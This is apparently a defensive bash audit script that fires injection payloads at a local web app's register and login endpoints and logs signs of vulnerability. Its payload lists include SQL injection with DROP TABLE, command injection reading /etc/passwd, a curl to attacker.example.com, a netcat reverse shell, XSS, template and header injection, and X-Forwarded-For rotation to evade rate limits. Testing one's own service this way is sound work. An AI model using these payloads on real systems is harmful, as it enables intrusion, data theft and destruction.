#!/bin/bash
# ============================================================
# BLACK BOX AUDIT - 02 - INJECTION ATTACKS
# SQL Injection, Command Injection, XSS, NoSQL Injection,
# LDAP Injection, Template Injection, JSON Injection
# ============================================================

BASE_URL="http://127.0.0.1:8080"
RESULTS_FILE="/tmp/bb_02_injection_results.txt"
PASS=0; FAIL=0; VULN=0

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; BLUE='\033[0;34m'; NC='\033[0m'

log_info() { echo -e "${BLUE}[INFO]${NC} $1" | tee -a "$RESULTS_FILE"; }
log_pass() { echo -e "${GREEN}[PASS]${NC} $1" | tee -a "$RESULTS_FILE"; PASS=$((PASS+1)); }
log_fail() { echo -e "${RED}[FAIL]${NC} $1" | tee -a "$RESULTS_FILE"; FAIL=$((FAIL+1)); }
log_vuln() { echo -e "${RED}[VULN]${NC} $1" | tee -a "$RESULTS_FILE"; VULN=$((VULN+1)); }

IP_COUNTER=0
next_ip() { IP_COUNTER=$((IP_COUNTER+1)); echo "10.$(( IP_COUNTER/254 )).$((IP_COUNTER % 254 + 1)).1"; }

# Envoie un payload et détecte si une vuln est probable
test_injection() {
    local label="$1"
    local field="$2"   # champ ciblé: username, password, first_name, last_name
    local payload="$3"
    local endpoint="${4:-/register}"
    local IP
    IP=$(next_ip)

    local body
    if [ "$endpoint" = "/login" ]; then
        body="{\"username\":\"$payload\",\"password\":\"$payload\"}"
    else
        body="{\"username\":\"$payload\",\"first_name\":\"$payload\",\"last_name\":\"normal\",\"password\":\"Test1234!\"}"
        if [ "$field" = "password" ]; then
            body="{\"username\":\"injectuser\",\"first_name\":\"A\",\"last_name\":\"B\",\"password\":\"$payload\"}"
        elif [ "$field" = "first_name" ]; then
            body="{\"username\":\"injectuser2\",\"first_name\":\"$payload\",\"last_name\":\"B\",\"password\":\"Test1234!\"}"
        fi
    fi

    RESP=$(curl -s -o /tmp/inj_body.txt -w "%{http_code}|%{time_total}" \
        -X POST "$BASE_URL$endpoint" \
        -H "Content-Type: application/json" \
        -H "X-Forwarded-For: $IP" \
        --data-raw "$body" 2>/dev/null)
    HTTP_CODE=$(echo "$RESP" | cut -d'|' -f1)
    TIME=$(echo "$RESP" | cut -d'|' -f2)
    BODY=$(cat /tmp/inj_body.txt 2>/dev/null)

    # Détection de signes de vulnérabilité
    VULN_SIGN=0
    # Erreur SQL exposée
    echo "$BODY" | grep -qiE "sql|sqlite|syntax error|near .+: syntax|SQLITE_ERROR|no such column|ambiguous column" && VULN_SIGN=1
    # Crash / signal inhabituel
    [ "$HTTP_CODE" = "500" ] && VULN_SIGN=2
    [ "$HTTP_CODE" = "000" ] && VULN_SIGN=3
    # Login réussi sur /login avec payload injection
    [ "$endpoint" = "/login" ] && echo "$BODY" | grep -qi "token\|welcome\|success\|logged" && VULN_SIGN=4
    # Réponse qui diffère bizarrement (temps > 2s = possible sleep injection)
    TIME_INT=$(echo "$TIME" | awk -F. '{print $1}')
    [ "$TIME_INT" -ge 2 ] 2>/dev/null && VULN_SIGN=5

    if [ "$VULN_SIGN" -ne 0 ]; then
        log_vuln "[$label] field=$field payload='${payload:0:60}' → HTTP $HTTP_CODE | time=${TIME}s | sign=$VULN_SIGN | body: $BODY"
    else
        log_pass "[$label] field=$field → HTTP $HTTP_CODE | body: ${BODY:0:80}"
    fi
    sleep 0.4
}

echo "" | tee "$RESULTS_FILE"
echo "========================================================" | tee -a "$RESULTS_FILE"
echo "  BLACK BOX AUDIT - 02 - INJECTION ATTACKS" | tee -a "$RESULTS_FILE"
echo "  Date: $(date '+%Y-%m-%d %H:%M:%S')" | tee -a "$RESULTS_FILE"
echo "========================================================" | tee -a "$RESULTS_FILE"
echo "" | tee -a "$RESULTS_FILE"

# ============================================================
# 1. SQL INJECTION CLASSIQUE
# ============================================================
echo "--- [1] SQL INJECTION CLASSIQUE ---" | tee -a "$RESULTS_FILE"
SQL_PAYLOADS=(
    "' OR '1'='1"
    "' OR '1'='1'--"
    "' OR 1=1--"
    "admin'--"
    "' OR 'x'='x"
    "') OR ('1'='1"
    "\" OR \"1\"=\"1"
    "' OR 1=1#"
    "' OR 1=1/*"
    "1' AND '1'='1"
    "' UNION SELECT 1,2,3--"
    "' UNION SELECT null,null,null--"
    "' UNION SELECT username,password FROM users--"
    "'; DROP TABLE users;--"
    "'; DROP TABLE users; SELECT * FROM users WHERE '1'='1"
    "1; SELECT SLEEP(3)--"
    "1' AND SLEEP(3)--"
    "'; WAITFOR DELAY '0:0:3'--"
    "' AND 1=CONVERT(int,@@version)--"
    "' AND extractvalue(1,concat(0x7e,version()))--"
)
for PAYLOAD in "${SQL_PAYLOADS[@]}"; do
    test_injection "SQLi" "username" "$PAYLOAD" "/register"
    test_injection "SQLi-login" "username" "$PAYLOAD" "/login"
done

echo "" | tee -a "$RESULTS_FILE"

# ============================================================
# 2. SQL INJECTION TIME-BASED (spécifique SQLite)
# ============================================================
echo "--- [2] SQL INJECTION TIME-BASED (SQLite) ---" | tee -a "$RESULTS_FILE"
SQLITE_PAYLOADS=(
    "' AND (SELECT COUNT(*) FROM sqlite_master)>0--"
    "' AND SUBSTR(sqlite_version(),1,1)='3'--"
    "' AND (SELECT name FROM sqlite_master WHERE type='table' LIMIT 1)='users'--"
    "'; SELECT randomblob(100000000)--"
    "' UNION SELECT sql FROM sqlite_master--"
    "' UNION SELECT name FROM sqlite_master WHERE type='table'--"
    "' AND (SELECT hex(randomblob(1000000000/2)))>''--"
)
for PAYLOAD in "${SQLITE_PAYLOADS[@]}"; do
    test_injection "SQLite-inject" "username" "$PAYLOAD" "/login"
done

echo "" | tee -a "$RESULTS_FILE"

# ============================================================
# 3. COMMAND INJECTION
# ============================================================
echo "--- [3] COMMAND INJECTION ---" | tee -a "$RESULTS_FILE"
CMD_PAYLOADS=(
    "; ls -la"
    "| ls -la"
    "\$(ls -la)"
    "\`ls -la\`"
    "&& ls -la"
    "; cat /etc/passwd"
    "| cat /etc/passwd"
    "\$(cat /etc/passwd)"
    "; id"
    "| id"
    "\$(id)"
    "; whoami"
    "; uname -a"
    "; env"
    "; printenv"
    "; ping -c 1 127.0.0.1"
    "; sleep 3"
    "| sleep 3"
    "\$(sleep 3)"
    "\`sleep 3\`"
    "; curl http://attacker.example.com"
    "| nc -e /bin/sh 127.0.0.1 4444"
)
for PAYLOAD in "${CMD_PAYLOADS[@]}"; do
    test_injection "CMDi" "username" "$PAYLOAD" "/register"
done

echo "" | tee -a "$RESULTS_FILE"

# ============================================================
# 4. XSS (Cross-Site Scripting)
# ============================================================
echo "--- [4] XSS PAYLOADS ---" | tee -a "$RESULTS_FILE"
XSS_PAYLOADS=(
    "<script>alert(1)</script>"
    "<script>alert('XSS')</script>"
    "<img src=x onerror=alert(1)>"
    "\"><script>alert(1)</script>"
    "';alert(1);//"
    "<svg onload=alert(1)>"
    "<iframe src=javascript:alert(1)>"
    "javascript:alert(1)"
    "<body onload=alert(1)>"
    "<input onfocus=alert(1) autofocus>"
    "<details open ontoggle=alert(1)>"
    "&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;"
    "%3Cscript%3Ealert(1)%3C/script%3E"
    "<script>alert(1)</script>"
    "<scr<script>ipt>alert(1)</scr</script>ipt>"
)
for PAYLOAD in "${XSS_PAYLOADS[@]}"; do
    test_injection "XSS" "first_name" "$PAYLOAD" "/register"
done

echo "" | tee -a "$RESULTS_FILE"

# ============================================================
# 5. NOSQL INJECTION
# ============================================================
echo "--- [5] NOSQL INJECTION ---" | tee -a "$RESULTS_FILE"
NOSQL_PAYLOADS=(
    '{"$gt":""}'
    '{"$ne":null}'
    '{"$where":"1==1"}'
    '{"$regex":".*"}'
    '{"$exists":true}'
    '{"$in":["admin","root","user"]}'
    '{"$or":[{"username":"admin"},{"username":"root"}]}'
)
# Pour NoSQL on injecte au niveau JSON (nested object)
for PAYLOAD in "${NOSQL_PAYLOADS[@]}"; do
    IP=$(next_ip)
    FULL_BODY="{\"username\":$PAYLOAD,\"first_name\":\"A\",\"last_name\":\"B\",\"password\":\"Test1234!\"}"
    RESP=$(curl -s -o /tmp/inj_body.txt -w "%{http_code}" \
        -X POST "$BASE_URL/register" \
        -H "Content-Type: application/json" \
        -H "X-Forwarded-For: $IP" \
        --data-raw "$FULL_BODY" 2>/dev/null)
    BODY=$(cat /tmp/inj_body.txt 2>/dev/null)
    if [ "$RESP" = "200" ] || [ "$RESP" = "201" ] || [ "$RESP" = "500" ]; then
        log_vuln "[NoSQLi] payload=$PAYLOAD → $RESP | $BODY"
    else
        log_pass "[NoSQLi] $PAYLOAD → $RESP"
    fi
    sleep 0.4
done

echo "" | tee -a "$RESULTS_FILE"

# ============================================================
# 6. TEMPLATE INJECTION (SSTI)
# ============================================================
echo "--- [6] SERVER-SIDE TEMPLATE INJECTION ---" | tee -a "$RESULTS_FILE"
SSTI_PAYLOADS=(
    "{{7*7}}"
    "\${7*7}"
    "<%= 7*7 %>"
    "#{7*7}"
    "*{7*7}"
    "{{config}}"
    "{{self.__dict__}}"
    "\${{7*7}}"
    "{{''.__class__.__mro__}}"
    "<%=7*7%>"
    "@(7*7)"
    "{7*7}"
    "\$(7*7)"
)
for PAYLOAD in "${SSTI_PAYLOADS[@]}"; do
    IP=$(next_ip)
    RESP=$(curl -s -o /tmp/inj_body.txt -w "%{http_code}" \
        -X POST "$BASE_URL/register" \
        -H "Content-Type: application/json" \
        -H "X-Forwarded-For: $IP" \
        -d "{\"username\":\"${PAYLOAD}\",\"first_name\":\"A\",\"last_name\":\"B\",\"password\":\"Test1234!\"}" 2>/dev/null)
    BODY=$(cat /tmp/inj_body.txt 2>/dev/null)
    echo "$BODY" | grep -q "49" && log_vuln "[SSTI] payload='$PAYLOAD' → réponse contient '49' (7*7=49)! HTTP $RESP | $BODY" || log_pass "[SSTI] $PAYLOAD → $RESP"
    sleep 0.4
done

echo "" | tee -a "$RESULTS_FILE"

# ============================================================
# 7. JSON INJECTION / MANIPULATION
# ============================================================
echo "--- [7] JSON INJECTION ---" | tee -a "$RESULTS_FILE"
JSON_TESTS=(
    # Double encoding de clé
    '{"username":"normal","username":"admin","first_name":"A","last_name":"B","password":"Test1234!"}'
    # Injection de champs extra (mass assignment)
    '{"username":"masstest","first_name":"A","last_name":"B","password":"Test1234!","role":"admin"}'
    '{"username":"masstest2","first_name":"A","last_name":"B","password":"Test1234!","is_admin":true}'
    '{"username":"masstest3","first_name":"A","last_name":"B","password":"Test1234!","id":1}'
    '{"username":"masstest4","first_name":"A","last_name":"B","password":"Test1234!","created_at":"1970-01-01"}'
    # Valeurs limites de types
    '{"username":null,"first_name":"A","last_name":"B","password":"Test1234!"}'
    '{"username":true,"first_name":"A","last_name":"B","password":"Test1234!"}'
    '{"username":[],"first_name":"A","last_name":"B","password":"Test1234!"}'
    '{"username":{},"first_name":"A","last_name":"B","password":"Test1234!"}'
    '{"username":1.7976931348623157e+308,"first_name":"A","last_name":"B","password":"Test1234!"}'
    # JSON profond (prototype pollution-like)
    '{"username":"__proto__","first_name":"A","last_name":"B","password":"Test1234!"}'
    '{"username":"constructor","first_name":"A","last_name":"B","password":"Test1234!"}'
    '{"__proto__":{"admin":true},"username":"prototest","first_name":"A","last_name":"B","password":"Test1234!"}'
)
for PAYLOAD in "${JSON_TESTS[@]}"; do
    IP=$(next_ip)
    RESP=$(curl -s -o /tmp/inj_body.txt -w "%{http_code}" \
        -X POST "$BASE_URL/register" \
        -H "Content-Type: application/json" \
        -H "X-Forwarded-For: $IP" \
        --data-raw "$PAYLOAD" 2>/dev/null)
    BODY=$(cat /tmp/inj_body.txt 2>/dev/null)
    if [ "$RESP" = "201" ] || [ "$RESP" = "500" ]; then
        log_vuln "[JSONi] → HTTP $RESP | body: $BODY | payload: ${PAYLOAD:0:80}"
    else
        log_pass "[JSONi] → HTTP $RESP | ${BODY:0:60}"
    fi
    sleep 0.4
done

echo "" | tee -a "$RESULTS_FILE"

# ============================================================
# 8. HEADER INJECTION
# ============================================================
echo "--- [8] HEADER INJECTION ---" | tee -a "$RESULTS_FILE"
HEADER_PAYLOADS=(
    "normal\r\nX-Injected: evil"
    "normal\nX-Injected: evil"
    "normal%0d%0aX-Injected: evil"
    "normal%0aX-Injected: evil"
    "normal\r\nSet-Cookie: session=evil"
    "normal\r\nLocation: http://evil.com"
)
for PAYLOAD in "${HEADER_PAYLOADS[@]}"; do
    IP=$(next_ip)
    RESP=$(curl -sv -X POST "$BASE_URL/register" \
        -H "Content-Type: application/json" \
        -H "X-Forwarded-For: $IP" \
        -H "X-Custom: $PAYLOAD" \
        -d '{"username":"hdrtest","first_name":"A","last_name":"B","password":"Test1234!"}' 2>&1 | grep -E "^[<]|HTTP/")
    log_info "[HeaderInject] X-Custom='${PAYLOAD:0:40}' → $RESP"
    sleep 0.4
done

echo "" | tee -a "$RESULTS_FILE"
echo "========================================================" | tee -a "$RESULTS_FILE"
echo "  RÉSULTATS INJECTION: $PASS PASS | $FAIL FAIL | $VULN VULN" | tee -a "$RESULTS_FILE"
echo "  Résultats complets: $RESULTS_FILE" | tee -a "$RESULTS_FILE"
echo "========================================================" | tee -a "$RESULTS_FILE"
